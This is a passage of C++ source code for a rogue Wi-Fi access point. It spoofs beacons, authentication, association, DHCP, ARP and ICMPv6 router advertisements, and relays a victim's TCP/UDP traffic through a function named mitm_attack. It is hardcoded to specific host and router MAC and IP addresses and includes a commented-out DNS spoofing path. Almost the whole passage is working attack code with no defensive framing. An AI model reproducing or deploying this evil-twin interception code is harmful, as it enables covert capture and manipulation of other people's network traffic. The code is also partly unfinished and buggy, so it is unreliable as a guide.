        std::perror("promisc_down: ioctl - SIOCSIFFLAGS");
        return -1;
    }

    // Success
    return 0;
}

int map_destruct(unsigned char *&ring) {
    // Unmap Memory
    if(munmap(ring, RING_FRAMES * getpagesize())) {
        std::perror("munmap");
        return -1;
    }

    // Success
    return 0;
}

void* process_rx(unsigned char *&ring, int sfd) {
    // Set Up Polling
    pollfd pfd;
    pfd.fd      = sfd;
    pfd.events  = POLLIN | POLLRDNORM | POLLERR;
    pfd.revents = 0;

    // Fetch Our RX Frame
    volatile tpacket2_hdr *header __aligned_tpacket = (tpacket2_hdr*)(ring + (rxring_offset * getpagesize()));

    // Sanity Check Our Frame
    assert(!(((unsigned long)header)&(getpagesize()-1)));

    // Check For Consumption 
    if(!(header->tp_status & TP_STATUS_USER)) {
        int ret = poll(&pfd, 1, -1);  // wait(poll)
        if(ret == -1) {
            if(errno != EINTR) {      // harder error
                std::perror("poll");
                return (void*)-1;     // let user lnow hard error
            }
            return NULL;              // let user know signal interuption
        }
    }

    /*// Check Frame Metadata
    if(header->tp_status & TP_STATUS_COPY) { // too long so truncated
        std::cerr << "\nTP_STATUS_COPY";
        return (void*)-2; // let user know(-2)
    }
    if(header->tp_status & TP_STATUS_LOSING) {
        std::cerr << "\nTP_STATUS_LOSING";
        return (void*)-2;   // let user know(-2)
    }*/

    // Success, Return Packet
    return (void*)header;
}

void* process_tx(unsigned char *&ring, int sfd, tpacket_req3 treq) {
    // Set Up Polling
    pollfd pfd;
    pfd.fd      = sfd;
    pfd.events  = POLLOUT;
    pfd.revents = 0;

    // Fetch Our TX Frame
    tpacket2_hdr *header = (tpacket2_hdr*)((ring + (treq.tp_block_size * treq.tp_block_nr))
                                                 + (txring_offset      * getpagesize()));

    // Sanity Check Our Frame
    assert(!(((unsigned long)header)&(getpagesize()-1)));

    // Check For Availability
    if((header->tp_status & ~TP_STATUS_AVAILABLE)) {
        int ret = poll(&pfd, 1, -1);  // wait(poll)
        if(ret == -1) {
            if(errno != EINTR) {      // harder error
                std::perror("poll");
                return (void*)-1;     // let user know hard error
            }
            return NULL;              // let user know signal interuption
        }
    }

    // Success, Return Packet
    return (void*)header;
}

void rx_release(unsigned char *&ring) {
    // Re-Fetch Our RX Frame
    volatile tpacket2_hdr *header __aligned_tpacket = (tpacket2_hdr*)(ring + (rxring_offset * getpagesize()));

    // Grant Kernel Status   
    header->tp_status = TP_STATUS_KERNEL; // flush status

    // Update Consumer Pointer
    rxring_offset = (rxring_offset + 1) & (RING_FRAMES - 1);
}

void tx_release(unsigned char *&ring, const unsigned len, tpacket_req3 treq) {
    // Re-Fetch Our TX Frame
    tpacket2_hdr *header = (tpacket2_hdr*)((ring + (treq.tp_block_size * treq.tp_block_nr))
                                                 + (txring_offset      * getpagesize()));   

    // Grant Send Status
    header->tp_len    = len;
    header->tp_status = TP_STATUS_SEND_REQUEST;

    // Update Consumer Pointer
    txring_offset = (txring_offset + 1) & (RING_FRAMES - 1);
}

int safe_usleep(const useconds_t usec) {
    // Check Usec
    if(!usec)
        return 0;

    // Declare TVs
    timeval tv1, tv2;

    // Initial TV
    if(gettimeofday(&tv1,  NULL)) {
        std::perror("gettimeofday");
        return -1;
    }
    
    // Usleep Depends On HZ, Why We Need The gettimeofday's
    if(usleep(usec)) {
        if(errno == EINTR) // interupt
            return -2;
    
        std::perror("usleep");
        return -1; // other error
    }
    
    // Final TV
    if(gettimeofday(&tv2, NULL)) {
        std::perror("gettimeofday");
        return -1;
    }

    // Compute Difference, Turn TV Into Microsecs
    const float tout = ((float)(tv2.tv_sec  - tv1.tv_sec) * 1000000) +
                        (float)(tv2.tv_usec - tv1.tv_usec);

    // Check Timeout
    if(tout < (float)usec) {
        std::cout << "\nTIME SHORT" << std::endl;
        if(usleep((float)usec - tout)) { // sleep remainder
            std::perror("usleep");
            return -1;
        }
    }

    // Success
    return 0;
}

uint64_t getCurTstamp() { // returns 0 on error
	timeval t;
	if(gettimeofday(&t, NULL)) {
        std::perror("gettimeofday");
		return 0;
	}
	
	// Convert Secs To Microsecs, *Ignores Value Wrap Arounds
	return (t.tv_sec * 1000000LL) + t.tv_usec;
}

int incrementTV(timeval *time, suseconds_t increment) {
    // Check Null Time
    if(!time)
        return -1;

    // Check Time Values
    if(time->tv_usec < 0 && time->tv_usec >= 1000000)
        return -1;
	
    // Check Increment and Add Secs
	if(increment >= 1000000) {
		time->tv_sec +=  increment / 1000000; // add secs
		increment     =  increment % 1000000; // keep the remainder
	}
	
    // Re-Check Increment
    if(increment >= 1000000)
        return -1;

    // Add Increment And Check For Overflow
	time->tv_usec += increment;
	if(time->tv_usec >= 1000000) {
	    time->tv_sec  += 1;
		time->tv_usec -= 1000000;

        // Re-Check Time Values
        if(time->tv_usec < 0 && time->tv_usec >= 1000000)
            return -1;
	}

    // Success
    return 0;
}

// Computes second = first - second
int diffTV(const timeval *first, timeval *second) {
	// Check Time Values
    if(!first && !second)
        return -1;
	
    // Compute Difference
	second->tv_sec  = first->tv_sec  - second->tv_sec;
	second->tv_usec = first->tv_usec - second->tv_usec;
	
	// Check For Underflow
	if(second->tv_usec < 0) {
		second->tv_sec  -= 1; // barrow sec from higher field
		second->tv_usec += 1000000;

        // Check Time Values
        if(second->tv_usec < 0 && second->tv_usec >= 1000000)
            return -1; // fail likely due to invalid initial TV values
	}

    // Success
    return 0;
}

// - If first < second, 0 If first == second, + If first > second
int compareTV(const timeval *first, const timeval *second) {
	// Get The Difference
    int diff = first->tv_sec - second->tv_sec;

    // If Secs Are ==, Check Microsecs
	if(!diff)
		diff = first->tv_usec - second->tv_usec;

    // Success
	return diff;
}

// PROCESS PACKET **********************************************************************************************************
int processPacket(const tpacket2_hdr *const packet, const unsigned size, const char *const iface, const uint8_t chan,
                  const int s_sfd) {

    // Check Values
    if(!packet || !size || !iface) {
        std::cerr << "\nprocessPacket value error\n";
        return -2;
    }

    // Declarations
    uint32_t remBytes = size;
    const sockaddr_ll *sll = (sockaddr_ll*)((uint8_t*)packet + (TPACKET2_HDRLEN - sizeof(sockaddr_ll)));
    APDescriptor apd = ap0;
    static bool handShake = false, authSent = false, assocSent = false;
    const ie80211_rtaphdr *rtap = (ie80211_rtaphdr*)((uint8_t*)packet + packet->tp_mac);
    
    // Convert TIP
    sockaddr_in sin;
    uint8_t     tip[IP_ALEN];
    inet_aton("192.168.0.29", &sin.sin_addr);
    std::memcpy(tip, &sin.sin_addr, IP_ALEN);

    // Check Radiotap Version 0
    if(rtap->it_version) {
        //std::cerr << "\nrtap version error\n";
        return -2;
    }
    
    // Update Bytes
    remBytes -= le16toh(rtap->it_len);

    // Check ieee80211 Header Bytes
    if(remBytes < sizeof(ieee80211_cts_hdr)) { // use smallest(CTS)
        //std::cerr << "\nprocessPacket hdr remBytes error\n";
        return -2;
    }

    // Process Frame
    const u_ieee80211_hdrs  *const ie80211_un = (u_ieee80211_hdrs*) ((uint8_t*)rtap + le16toh(rtap->it_len)); // union
    const ieee80211_fcs_hdr *const fcs        = (ieee80211_fcs_hdr*)((uint8_t*)rtap + le16toh(rtap->it_len)); // frame ctrl
    switch(GetFrameType(fcs)) {
    case WIFI_MGMT_FRAME: // MGMT
        // Process Frame Subtype
        switch(GetFrameSubType(fcs)) {
        case WIFI_BEACON:
            break;
        case WIFI_PROBEREQ: {
            // Check For BCast SSID(0 length) Or Driected To Us
            ieee80211_ie_ssid *ie_ssid = (ieee80211_ie_ssid*)((uint8_t*)ie80211_un +        
                                          sizeof(ieee80211_hdr3)) + sizeof(ieee80211_probe_req);
            if(!ie_ssid->len) { // zero
                // Send Probe Resp
                if(sendBeacon(&ap0, chan, baseRate_80211B, iface, TRUE, ie80211_un->ieee80211_mgmt.sa, s_sfd) == -1) { // send beacon
                    std::cerr << "\nsendBeacon(as probe resp) error\n";
                    return -1;
                }
            }
            else if(!std::memcmp(ie_ssid->ssid, apd.ssid, apd.ssidLen)) { // our SSID
                // Send Ack
                if(sendAck(&apd, chan, baseRate_80211B, iface, ie80211_un->ieee80211_mgmt.sa, FALSE, s_sfd)) {
                    std::cerr << "\nsendAck error\n";
                    return -1;
                }
                
                // Send Probe Resp
                if(sendBeacon(&ap0, chan, baseRate_80211B, iface, TRUE, ie80211_un->ieee80211_mgmt.sa, s_sfd) == -1) { // send beacon
                    std::cerr << "\nsendBeacon(as probe resp) error\n";
                    return -1;
                }

                // Send CTS, Triggers Host To Send Auth
                if(sendAck(&apd, chan, baseRate_80211B, iface, ie80211_un->ieee80211_mgmt.sa, TRUE, s_sfd)) {
                    std::cerr << "\nsendAck(as cts) error\n";
                    return -1;
                }
            }
            break;
        }
        case WIFI_AUTH:
            // Check For Us And Auth Args
            if(!authSent && le16toh(ie80211_un->ieee80211_mgmt.u.auth.auth_alg) == 0x0000 && // open system
               le16toh(ie80211_un->ieee80211_mgmt.u.auth.auth_transaction) == 0x0001 && // seq 1
               !std::memcmp((const char*)ie80211_un->ieee80211_mgmt.da, (const char*)apd.macAddr, ETH_ALEN)) { // to us
                // Send Ack
                if(sendAck(&apd, chan, baseRate_80211B, iface, ie80211_un->ieee80211_mgmt.sa, FALSE, s_sfd)) {
                    std::cerr << "\nsendAck error\n";
                    return -1;
                }

                // Send Auth Resp
                if(sendAuthResp(&apd, chan, baseRate_80211B, iface, ie80211_un->ieee80211_mgmt.sa, s_sfd)) {
                    std::cerr << "\nsendAuthResp error\n";
                    return -1;
                }
                
                authSent = true;
            }
            break;
        case WIFI_ASSOCREQ:
            // Check For Us And Make Sure authSent/authAck Are True
            if(!assocSent && !std::memcmp((const char*)ie80211_un->ieee80211_mgmt.da, (const char*)apd.macAddr, ETH_ALEN)) { // to us
                // Send Ack
                if(sendAck(&apd, chan, baseRate_80211B, iface, ie80211_un->ieee80211_mgmt.sa, FALSE, s_sfd)) {
                    std::cerr << "\nsendAck error\n";
                    return -1;
                }
                
                // Send Assoc Resp
                if(sendAssoscResp(&apd, chan, baseRate_80211B, iface, ie80211_un->ieee80211_mgmt.sa, s_sfd)) {
                    std::cerr << "\nsendAssosResp error\n";
                    return -1;
                }


                // Send ARP Request, Triggers Host To Send DHCP
                if(sendARP(&apd, chan, baseRate_80211BG, iface, tip, IEEE80211_BCAST_ADDR, ARPOP_REQUEST, s_sfd)) {
                    std::cerr << "\nsendARP error\n";
                    return -1;
                }

                assocSent = true;
            }
            break;
        case WIFI_REASSOCREQ:
            break;
        default:
            break;
        };
        break;
    case WIFI_CTRL_FRAME: // CTRL
        // Process Frame Subtype
        switch(GetFrameSubType(fcs)) {
        case WIFI_ACK:
            if(!std::memcmp((const char*)ie80211_un->ieee80211_ack.ra, (const char*)apd.macAddr, ETH_ALEN)) { // to us
                //std::cout << "\nCTRLACK";
                std::fflush(stdout);
            }
            break;
        case WIFI_RTS:
            if(!std::memcmp((const char*)ie80211_un->ieee80211_rts.ra, (const char*)apd.macAddr, ETH_ALEN)) { // to us 
                // Send CTS
                if(sendAck(&apd, chan, baseRate_80211B, iface, ie80211_un->ieee80211_rts.ta, TRUE, s_sfd)) {
                    std::cerr << "\nsendAck(as cts) error\n";
                    return -1;
                }
            }
            break;
        default:
            break;
        };
        break;
    case WIFI_DATA_FRAME: { // Data
        /* FromDS(01) -> DA   (addr1), BSSID(addr2), SA(addr3) (AP -> STA)
           ToDS  (10) -> BSSID(addr1)  SA   (addr2), DA(addr3) (AP <- STA) */
        const llc_snap_hdr *const llcS   = (llc_snap_hdr*)((uint8_t*)ie80211_un + sizeof(ieee80211_hdr3));
        const arphdr2      *const arp    = (arphdr2*)((uint8_t*)llcS + sizeof(llc_snap_hdr));
        const iphdr        *const ip     = (iphdr*)((uint8_t*)llcS + sizeof(llc_snap_hdr));
        const ipv6hdr      *const ipv6   = (ipv6hdr*)((uint8_t*)llcS + sizeof(llc_snap_hdr));
        const udphdr       *const udp    = (udphdr*)((uint8_t*)ip + (ip->ihl * 4));
        const icmphdr      *const icmp   = (icmphdr*)((uint8_t*)ip + (ip->ihl * 4));
        const icmpv6hdr    *const icmpv6 = (icmpv6hdr*)((uint8_t*)ipv6 + sizeof(ipv6hdr));
        const dhcphdr      *const dhcp   = (dhcphdr*)((uint8_t*)udp + sizeof(udphdr));
        const dhcp_options *const dhcp_o = (dhcp_options*)((uint8_t*)dhcp + sizeof(dhcphdr));
        const dnshdr       *const dns    = (dnshdr*)((uint8_t*)udp + sizeof(udphdr));
 
        // Host And Router MACs And IPs
        uint8_t hostMAC[ETH_ALEN],routerMAC[ETH_ALEN], realMAC[ETH_ALEN];
        std::memset(hostMAC,   0, ETH_ALEN);
        std::memset(routerMAC, 0, ETH_ALEN);
        std::memset(realMAC,   0, ETH_ALEN);
        std::memcpy((void *const)realMAC,   (const void *const)ether_aton("1c:3e:84:8a:4c:26"), ETH_ALEN);
        std::memcpy((void *const)hostMAC,   (const void *const)ether_aton("e8:50:8b:0b:f5:2d"), ETH_ALEN);
        std::memcpy((void *const)routerMAC, (const void *const)ether_aton("00:26:88:ea:48:08"), ETH_ALEN);
        sockaddr_in sin;
        uint8_t     routerIP[IP_ALEN];
        inet_aton("192.168.0.1", &sin.sin_addr);
        std::memcpy(routerIP, &sin.sin_addr, IP_ALEN);

        // Check To Send Ack
        if(((le16toh(ie80211_un->ieee80211_3.frame_control) & 0x0300) >> 8) == 0x01                     && // toDS(0x01)
           !std::memcmp((const char*)ie80211_un->ieee80211_3.addr1, (const char*)apd.macAddr, ETH_ALEN) && // our BSSID
            std::memcmp((const char*)ie80211_un->ieee80211_3.addr3, (const char*)IEEE80211_BCAST_ADDR, ETH_ALEN) &&     // DA not bcast
            std::memcmp((const char*)ie80211_un->ieee80211_3.addr3, (const char*)IEEE80211_IPV6MCAST_ADDR, ETH_ALEN)) { // DA is not IPv6mcast, 33:33:00:00:00:02
            if(sendAck(&apd, chan, baseRate_80211B, iface, ie80211_un->ieee80211_3.addr2, FALSE, s_sfd)) {
                std::cerr << "\nsendAck error\n";
                return -1;
            }
        }

        // Check DHCP Request
        if(!handShake && ((le16toh(ie80211_un->ieee80211_3.frame_control) & 0x0300) >> 8) == 0x01       && // toDS(0x01)
           !std::memcmp((const char*)ie80211_un->ieee80211_3.addr1, (const char*)apd.macAddr, ETH_ALEN) && // our BSSID
           !std::memcmp((const char*)ie80211_un->ieee80211_3.addr3, (const char*)IEEE80211_BCAST_ADDR, ETH_ALEN) && // DA is MAC_BCAST
           llcS->ether_type == htons(ETH_P_IP) && ip->protocol == IPPROTO_UDP                           && // IP, UDP
           udp->source == htons(BOOTPC_PORT) && udp->dest == htons(BOOTPS_PORT)                         && // bootpc, bootps
           dhcp->op == BOOTP_REQUEST) {                                                                    // boot req
            // Check Msg Type
            uint8_t dhcp_type = 0;
            if(dhcp_o->type == DHCP_DISCOVER)
                dhcp_type = DHCP_OFFER;
            else if(dhcp_o->type == DHCP_REQUEST) {
                dhcp_type = DHCP_ACK;
                handShake = true;
            }
            else {
                std::cerr << "\nunknown dhcp msg type\n";
                break;
            }

            // Send DHCP
            if(sendDHCP(&apd, chan, baseRate_80211B, iface, tip, ie80211_un->ieee80211_3.addr2, dhcp->xid, s_sfd, dhcp_type)) { // xid already in htonl
                std::cerr << "\nsendDHCP error\n";
                return -1;
            }

            if(dhcp_type == DHCP_OFFER)
                std::cout << "\nDHCP_OFFER";
            else
                std::cout << "\nDHCP_ACK";
            std::fflush(stdout);
        }

        /////////////////////////////////////////////////////////////////////??DONT NEED IF MITM WOULD WORK
        // Check DNS Request
        /*if(((le16toh(ie80211_un->ieee80211_3.frame_control) & 0x0300) >> 8) == 0x01                     && // toDS(0x01)
           !std::memcmp((const char*)ie80211_un->ieee80211_3.addr1, (const char*)apd.macAddr, ETH_ALEN) && // our BSSID
           !std::memcmp((const char*)ie80211_un->ieee80211_3.addr3, (const char*)apd.macAddr, ETH_ALEN) && // DA is us
           llcS->ether_type == htons(ETH_P_IP) && ip->protocol == IPPROTO_UDP                           && // IP, UDP
           udp->dest == htons(53)) {                                                                       // domain
            // Send DNS
            if(sendDNS(&apd, chan, baseRate_80211B, iface, tip, ie80211_un->ieee80211_3.addr2, dns->xid, s_sfd)) { // xid already in htonl
                std::cerr << "\nsendDHCP error\n";
                return -1;
            }
                        
            std::cout << "\nDNS";
            std::fflush(stdout);
        }*/

        // Check ARP Request
        if(((le16toh(ie80211_un->ieee80211_3.frame_control) & 0x0300) >> 8) == 0x01                     && // toDS(0x01)
           !std::memcmp((const char*)ie80211_un->ieee80211_3.addr1, (const char*)apd.macAddr, ETH_ALEN) && // our BSSID
           !std::memcmp((const char*)ie80211_un->ieee80211_3.addr3, (const char*)IEEE80211_BCAST_ADDR, ETH_ALEN) && // DA is MAC_BCAST
           llcS->ether_type == htons(ETH_P_ARP) && arp->ar_op == htons(ARPOP_REQUEST)) {                   // arp and arp_req
            // Send ARP Reply
            if(sendARP(&apd, chan, baseRate_80211BG, iface, tip, ie80211_un->ieee80211_3.addr2, ARPOP_REPLY, s_sfd)) {
                std::cerr << "\nsendARP error\n";
                return -1;
            }
        }

        // Check ICMP Echo Request(Ping)
        if(((le16toh(ie80211_un->ieee80211_3.frame_control) & 0x0300) >> 8) == 0x01                     &&   // toDS(0x01)
           !std::memcmp((const char*)ie80211_un->ieee80211_3.addr1, (const char*)apd.macAddr, ETH_ALEN) &&   // our BSSID
           !std::memcmp((const char*)ie80211_un->ieee80211_3.addr3, (const char*)apd.macAddr, ETH_ALEN) &&   // DA is us
           llcS->ether_type == htons(ETH_P_IP) && ip->protocol == IPPROTO_ICMP && icmp->type == ICMP_ECHO) { // IP, ICMP, Echo
            // Send ICMP Echo Reply
            if(sendICMP(&apd, chan, baseRate_80211BG, iface, tip, ie80211_un->ieee80211_3.addr2, ICMP_ECHOREPLY, 0, s_sfd)) {
                std::cerr << "\nsendICMP error\n";
                return -1;
            }

            std::cout << "\nICMP";
            std::fflush(stdout);
        }

        // Check ICMPv6 Neighbor Discovery(Router Solicitation)
        if(((le16toh(ie80211_un->ieee80211_3.frame_control) & 0x0300) >> 8) == 0x01                     &&    // toDS(0x01)
           !std::memcmp((const char*)ie80211_un->ieee80211_3.addr1, (const char*)apd.macAddr, ETH_ALEN) &&    // our BSSID
           !std::memcmp((const char*)ie80211_un->ieee80211_3.addr3, (const char*)IEEE80211_IPV6MCAST_ADDR, ETH_ALEN) && // DA is IPv6mcast, 33:33:00:00:00:02
           llcS->ether_type == htons(ETH_P_IPV6) && ipv6->nexthdr == IPPROTO_ICMPV6 && icmpv6->type == 133) { // IPv6, ICMPv6, Router Solicitation = 133
            // Send ICMP Echo Reply
            if(sendICMPv6(&apd, chan, baseRate_80211BG, iface, IEEE80211_IPV6MCAST_ADDR, 134, 0, s_sfd)) { // Router Advertisement = 134
                std::cerr << "\nsendICMP error\n";
                return -1;
            }

            std::cout << "\nICMPv6";
            std::fflush(stdout);
        }

        // Man In The Middle(MITM) All Data Sent From Host, Send To Legit Router(To Us)
        if(((le16toh(ie80211_un->ieee80211_3.frame_control) & 0x0300) >> 8) == 0x01                     && // toDS(0x01)
           !std::memcmp((const char*)ie80211_un->ieee80211_3.addr1, (const char*)apd.macAddr, ETH_ALEN) && // our BSSID
            std::memcmp((const char*)ie80211_un->ieee80211_3.addr2, (const char*)apd.macAddr, ETH_ALEN) && // SA not our mac          
           !std::memcmp((const char*)ie80211_un->ieee80211_3.addr3, (const char*)apd.macAddr, ETH_ALEN) && // DA is us
           llcS->ether_type == htons(ETH_P_IP)                                                          && // IP
           (ip->protocol == IPPROTO_TCP || ip->protocol == IPPROTO_UDP)                                 && // TCP, UDP /////////////////////////////////////split up udp and tcp in new if/slse
           udp->source != htons(BOOTPC_PORT) && udp->dest != htons(BOOTPS_PORT)) {                         // !bootpc, !bootps
            mitm_attack((uint8_t*)rtap, packet->tp_snaplen, iface, FALSE, hostMAC, routerMAC, routerIP, s_sfd);
            
            std::cout << "\nMITM-OUT";
            std::fflush(stdout);

            /*// Send CTS
            if(sendAck(&apd, chan, baseRate_80211B, iface, routerMAC, TRUE, s_sfd)) {
                std::cerr << "\nsendAck(as cts) error\n";
                return -1;
            }*/
        }
        // Man In The Middle(MITM) All Data Sent From Legit Router, Send To Host(From Us)
        else if(((le16toh(ie80211_un->ieee80211_3.frame_control) & 0x0300) >> 8) == 0x02              && // fromDS(0x02)
           !std::memcmp((const char*)ie80211_un->ieee80211_3.addr1, (const char*)realMAC,   ETH_ALEN) && // DA is our MAC
           !std::memcmp((const char*)ie80211_un->ieee80211_3.addr2, (const char*)routerMAC, ETH_ALEN) && // our routers BSSID
           !std::memcmp((const char*)ie80211_un->ieee80211_3.addr3, (const char*)routerMAC, ETH_ALEN) && // SA is our router
           llcS->ether_type == htons(ETH_P_IP) &&                                                        // IP
           (ip->protocol == IPPROTO_TCP || ip->protocol == IPPROTO_UDP)) {                               // TCP, UDP /////////////////////////////////////split up udp and tcp in new if/slse
            mitm_attack((uint8_t*)rtap, packet->tp_snaplen, iface, TRUE, hostMAC, routerMAC, tip, s_sfd);
                        
            std::cout << "\nMITM-IN";
            std::fflush(stdout);
        }
        break;
    }
    case WIFI_EXT_FRAME:  // Extension
        break;
    default:              // Other
        break;
    };

    // Success
    return 0;
}

int createSendSocket(const char *const iface) {
    // Check Values
    if(!iface) {
        std::cerr << "\ncreatSendSocket value error\n";
        return -1;
    }

    // Create RAW Socket
    int sfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(sfd == -1) {
        std::perror("createSendSocket: socket");
        return -1;
    }
    
    // Declarations
    ifreq       ifr;
    sockaddr_ll sll;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));
    std::memset(&sll, 0, sizeof(sll)); 
    
    // Get Interface Index
    std::strncpy(ifr.ifr_name, iface, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCGIFINDEX, &ifr) == -1) {
        std::perror("createSendSocket: ioctl - SIOCGIFINDEX");
        return -1;
    }

    // Set Up Socket Link-Layer Address
    sll.sll_ifindex  = ifr.ifr_ifindex;
    sll.sll_family   = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_802_2);
    sll.sll_hatype   = htons(ARPHRD_IEEE80211_RADIOTAP);
    //sll.sll_pkttype  = PACKET_HOST;
    //sll.sll_halen    = ETH_ALEN;
    //std::memcpy(&sll.sll_addr, apd->macAddr, ETH_ALEN); // copy in

    // Bind RAW Socket
    if(bind(sfd, (sockaddr*)&sll, sizeof(sll))) {
        std::perror("createSendSocket: bind");
        return -1;
    }

    // Success
    return sfd;
}

int createSocket(const APDescriptor *const apd, const char *const iface, const bool rfmon, const bool promisc) {
    // Declarations
    sockaddr_ll  sll;
    ifreq        ifr;
    iwreq        iwr;
    tpacket_req3 treq;

    // Zero Out Data
    std::memset(&sll,      0, sizeof(sll));
    std::memset(&ifr,      0, sizeof(ifr));
    std::memset(&iwr,      0, sizeof(iwr));
    std::memset(&old_iwr,  0, sizeof(old_iwr));
    std::memset(&old_ifr,  0, sizeof(old_ifr));
    std::memset(&treq,     0, sizeof(treq));

    // Create RAW Socket
    int sfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(sfd == -1) {
        std::perror("socket");
        return -1;
    }
    
    // Get Interface Index
    std::strncpy(ifr.ifr_name, iface, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCGIFINDEX, &ifr) == -1) {
        std::perror("ioctl - SIOCGIFINDEX");
        return -1;
    }

    // Save Interface Mode
    std::strncpy(old_iwr.ifr_name, iface, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCGIWMODE, &old_iwr) == -1) {
        std::perror("ioctl - SIOCGIWMODE");
        return -1;
    }

    // Get Interface Flags
    std::strncpy(ifr.ifr_name, iface, IFNAMSIZ); // copy in interface device   
    if((ioctl(sfd, SIOCGIFFLAGS, &ifr) == -1)) {
	    std::perror("ioctl - SIOCGIFFLAGS1");
	    return -1;
	}
    
    // Save Interface Flags
    old_ifr.ifr_flags = ifr.ifr_flags;

    // Check If Interface Is Up
    if((ifr.ifr_flags & IFF_UP & IFF_BROADCAST & IFF_RUNNING) != ifr.ifr_flags) {
        // Or In Up, Broadcast, Running
        ifr.ifr_flags |= IFF_UP | IFF_BROADCAST | IFF_RUNNING;

        // Set Interface Flags   
        if(ioctl(sfd, SIOCSIFFLAGS, &ifr) == -1) {
            std::perror("ioctl - SIOCSIFFLAGS");
            return -1;
        }
    }

    // Set Packet Version
    int v = TPACKET_V2;
    if(setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &v, sizeof(v)) == -1) { ///////////////////////////////////// prob dont need == -1
        std::perror("setsockopt - PACKET_VERSION");
        return -1;
    }

    // Set Up Receiving Ring Sizes
    treq.tp_block_size       = RING_FRAMES * getpagesize();
    treq.tp_block_nr         = 1;   
    treq.tp_frame_size       = getpagesize();
    treq.tp_frame_nr         = RING_FRAMES;
    treq.tp_retire_blk_tov   = 60;
    treq.tp_feature_req_word = TP_FT_REQ_FILL_RXHASH;

    // Sanity Checks
    if((treq.tp_frame_size <= TPACKET_HDRLEN)   ||
       (treq.tp_frame_size % TPACKET_ALIGNMENT) ||
       (treq.tp_block_size % treq.tp_frame_size)) {
        std::cerr << "\nSanity Checks";
        return -1;
    }
    
    // Attach Packet Rings
    if(setsockopt(sfd, SOL_PACKET, PACKET_RX_RING, &treq, sizeof(treq)) == -1) {
        std::perror("setsockopt - PACKET_RX_RING");
        return -1;
    }
  
    // Set Up Time Outs
    struct timeval receive_timeout;
    receive_timeout.tv_sec  = 1;
    receive_timeout.tv_usec = 0;
    if(setsockopt(sfd, SOL_SOCKET, SO_RCVTIMEO, &receive_timeout, sizeof(receive_timeout)) == -1) {
        std::perror("setsockopt - SO_RCVTIMEO");
        return -1;
    }
    
    // Memory Map For Semi-Zero Copy
    if((ring = (uint8_t*)mmap(NULL, treq.tp_block_size * treq.tp_block_nr,
                                    PROT_READ | PROT_WRITE, MAP_SHARED, sfd, 0)) == MAP_FAILED) {
        std::perror("mmap");
        return -1;
    }
    
    // Set Up Monitor Mode
    if(rfmon)
        if(rfmon_up(iface, sfd))
            return -1;

    // Set Promiscous Mode
    if(promisc)
        if(promisc_up(iface, sfd))
            return -1;;

    // Success
    return sfd;
}

int sendUDP(const uint8_t *const packet, const unsigned len) {
    // Create RAW Socket
    int sfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sfd == -1) {
        std::perror("sendUDP: socket");
        return -1;
    }

    // Set Up Sock Address(si)
    sockaddr_in si;
    std::memset((void*)&si, 0, sizeof(sockaddr_in));
     
    si.sin_family = AF_INET;
    si.sin_port = htons(4444);
    si.sin_addr.s_addr = htonl(INADDR_ANY);
     
    // Bind RAW Socket
    if(bind(sfd, (sockaddr*)&si, sizeof(si))) {
        std::perror("sendUDP: bind");
        return -1;
    }

    // Set Up Sock Address(di)
    sockaddr_in di;
    std::memset((void*)&di, 0, sizeof(sockaddr_in));
     
    di.sin_family      = AF_INET;
    di.sin_port        = htons(53);
    di.sin_addr.s_addr = inet_addr("192.168.0.1");

    // Send Packet
    if(sendto(sfd, packet, len, 0, (sockaddr*)&di, sizeof(di)) == -1) {
        std::perror("sendUDP: sendto");
        return -1;
    }

    // Close Socket
    if(close(sfd)) {
        std::perror("sendUDP: close");
        return -1;
    }

    // Success
    return 0;
}

void header_dump(const unsigned char *const buf, const unsigned len) {
    // Temp Buffer
    const unsigned P_LEN = len + 1; // null term
    char temp[P_LEN];

    // Zero Out
    std::memset(temp, 0, P_LEN);

    // Print Total Bytes
    std::cout << "\nTotal Bytes: " << len;

    // Newline
    std::cout << '\n';

    for(std::size_t i = 0; i < len; ++i) {
        // Print Hex Interpretation
        std::snprintf(temp, P_LEN, "%2X ", buf[i]);
        std::cout << temp;

        // Check Hex Line Cutoff
        if((i % 16) == 15 || i == len-1) {
            // Line Up Spacing of Last Line of Hex
            for(std::size_t j = 0; j < 15 - (i % 16); ++j)
                std::cout << "   ";

            // Divider Bar Between Hex and Readable Form
            std::cout << "| ";
            
            // Decode Into Human Readable Form
            for(std::size_t j = (i - (i % 16)); j <= i; ++j) {
                unsigned char c = buf[j];
                if((c > 31) && (c < 127)) // readable ASCII
                    std::cout << c;
                else                      // unreadable ASCII
                    std::cout << '.';
            }
            
            // Newline
            std::cout << '\n';
        }
    }
}

int sendBeacon(const APDescriptor *const apd, const uint8_t chan, const uint8_t dRate, const char *const iface,
               const bool probeResp, const unsigned char *const da, const int sfd) {
    // Check apd
    if(!apd) {
        std::cerr << "\napd error\n";
        return -1;
    }
    
    // Declarations
    ifreq       ifr;
    sockaddr_ll dll;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));
    std::memset(&dll, 0, sizeof(dll)); 

    // Set Rate
    uint8_t rate  = dRate & IEEE80211_RATE_VAL,
            flags = IEEE80211_RADIOTAP_F_FCS; // FCS

    // Get Channel
    uint16_t chan_freq  = chan_to_freq(chan);
    if(!chan_freq) {
        return -1;
        std::cerr << "\nchannel error";
    }

    uint16_t chan_flags = IEEE80211_CHAN_OFDM | IEEE80211_CHAN_2GHZ; // 0x00c0, OFDN + 2Ghz (pure-g)

    // Beacon Size
    std::size_t BEACON_SIZE = sizeof(ie80211_rtaphdr) + sizeof(flags) + sizeof(dRate) +
                              sizeof(chan_freq) + sizeof(chan_flags) + sizeof(ieee80211_hdr3) +
                              sizeof(ieee80211_beacon) + sizeof(ieee80211_ie_ssid) + apd->ssidLen + 
                              sizeof(ieee80211_ie_rates) + apd->dataRatesLen + sizeof(ieee80211_ie_ds_param) +
                              sizeof(ieee80211_ie_tim) + sizeof(ieee80211_ie_erp_info) +
                              sizeof(ieee80211_ie_rates) + apd->dataRatesExtLen + sizeof(uint32_t/* FCS)*/);

    // Alloc Frame
